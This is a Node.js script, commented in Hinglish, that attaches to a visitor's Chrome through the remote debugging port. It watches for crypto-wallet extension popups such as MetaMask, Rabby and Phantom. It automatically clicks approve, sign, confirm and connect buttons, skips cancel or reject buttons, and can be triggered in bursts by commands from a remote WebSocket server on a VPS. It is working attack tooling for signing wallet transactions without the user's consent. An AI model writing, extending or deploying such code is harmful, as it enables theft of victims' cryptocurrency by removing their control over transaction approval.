#!/usr/bin/env node
/**
 * Visitor PC par chalao — local Chrome CDP → server ko extension control deta hai.
 * Isse visitor ke MetaMask popup par server se auto-click hota hai.
 *
 * Setup:
 *   1. Chrome: chrome.exe --remote-debugging-port=9222
 *   2. node visitor-cdp-bridge.mjs --server ws://YOUR_VPS:8791
 *
 * Optional auto-launch Chrome with debug port.
 */

import { chromium } from 'playwright';
import WebSocket from 'ws';
import { spawn } from 'node:child_process';
import { existsSync } from 'node:fs';

const EXT_APPROVE_RE = /approve|confirm|sign|authorize|allow|switch|connect|next|proceed|submit/i;
const EXT_REJECT_RE = /^(cancel|reject|decline|close|not now|no|back)$/i;

function parseArgs() {
  const args = process.argv.slice(2);
  const out = {
    server: process.env.PW_BRIDGE_SERVER || 'ws://127.0.0.1:8791',
    cdp: process.env.CDP_URL || 'http://127.0.0.1:9222',
    launchChrome: false,
    chromePath: process.env.CHROME_PATH || findChrome(),
  };
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--server' && args[i + 1]) out.server = args[++i];
    else if (args[i] === '--cdp' && args[i + 1]) out.cdp = args[++i];
    else if (args[i] === '--launch-chrome') out.launchChrome = true;
    else if (args[i] === '--chrome' && args[i + 1]) out.chromePath = args[++i];
  }
  return out;
}

function findChrome() {
  const paths = [
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    '/usr/bin/google-chrome',
  ];
  return paths.find((p) => existsSync(p)) || 'chrome';
}

async function launchDebugChrome(chromePath, port = 9222) {
  const userData = `${process.cwd()}/.chrome-cdp-profile`;
  spawn(chromePath, [
    `--remote-debugging-port=${port}`,
    `--user-data-dir=${userData}`,
    '--no-first-run',
    '--no-default-browser-check',
  ], { detached: true, stdio: 'ignore' }).unref();
  await new Promise((r) => setTimeout(r, 2500));
}

class CdpClicker {
  constructor(cdpUrl) {
    this.cdpUrl = cdpUrl;
    this.browser = null;
    this.clicks = 0;
    this.timer = null;
  }

  async connect() {
    this.browser = await chromium.connectOverCDP(this.cdpUrl);
    this.timer = setInterval(() => this.tick(), 350);
    console.log('[cdp-bridge] attached', this.cdpUrl);
  }

  pages() {
    return this.browser?.contexts().flatMap((c) => c.pages()) || [];
  }

  async tick() {
    for (const page of this.pages()) {
      const url = page.url();
      const title = (await page.title().catch(() => '')) || '';
      const isExt =
        /notification\.html|popup\.html|chrome-extension:/i.test(url) ||
        /MetaMask|Rabby|Coinbase|OKX|Trust|Phantom/i.test(title);
      if (!isExt) continue;

      for (const frame of page.frames()) {
        try {
          for (const b of await frame.locator('button, [role="button"]').all()) {
            const text = ((await b.innerText().catch(() => '')) || '').trim();
            const aria = (await b.getAttribute('aria-label').catch(() => '')) || '';
            const label = text || aria;
            if (!label || EXT_REJECT_RE.test(label)) continue;
            if (!EXT_APPROVE_RE.test(label)) continue;
            if (!(await b.isVisible().catch(() => false))) continue;
            await b.click({ timeout: 2000 }).catch(() => {});
            this.clicks++;
            console.log('[cdp-bridge] clicked:', label.slice(0, 50));
            return;
          }
        } catch { /* */ }
      }
    }
  }

  async burst(n = 30) {
    for (let i = 0; i < n; i++) {
      await this.tick();
      await new Promise((r) => setTimeout(r, 150));
    }
  }

  async close() {
    clearInterval(this.timer);
    await this.browser?.close().catch(() => {});
  }
}

async function main() {
  const opts = parseArgs();

  if (opts.launchChrome) {
    console.log('[cdp-bridge] launching Chrome debug...');
    await launchDebugChrome(opts.chromePath);
  }

  const clicker = new CdpClicker(opts.cdp);
  let retries = 0;
  while (retries < 10) {
    try {
      await clicker.connect();
      break;
    } catch (e) {
      retries++;
      console.log(`[cdp-bridge] CDP retry ${retries}/10...`);
      await new Promise((r) => setTimeout(r, 1500));
    }
  }
  if (!clicker.browser) {
    console.error('CDP failed. Start Chrome: chrome.exe --remote-debugging-port=9222');
    process.exit(1);
  }

  const ws = new WebSocket(opts.server);

  ws.on('open', () => {
    console.log('[cdp-bridge] connected to server', opts.server);
    ws.send(JSON.stringify({
      type: 'cdp-bridge:hello',
      payload: { cdp: opts.cdp, role: 'visitor-cdp-agent' },
    }));
  });

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch { return; }

    if (msg.type === 'cdp:burst' || msg.type === 'ext:burst') {
      await clicker.burst(msg.count || 25);
    }
    if (msg.type === 'cdp:click' || msg.type === 'ext:click') {
      await clicker.tick();
    }
    if (msg.type === 'visitor:ext:popup-expected' || msg.type === 'visitor:ext:page-hidden') {
      await clicker.burst(20);
    }
  });

  ws.on('close', () => {
    console.log('[cdp-bridge] server disconnected, reconnecting...');
    setTimeout(() => main().catch(console.error), 3000);
  });

  console.log('[cdp-bridge] extension auto-click ACTIVE on local Chrome');
  process.on('SIGINT', async () => {
    await clicker.close();
    ws.close();
    process.exit(0);
  });
}

main().catch(console.error);
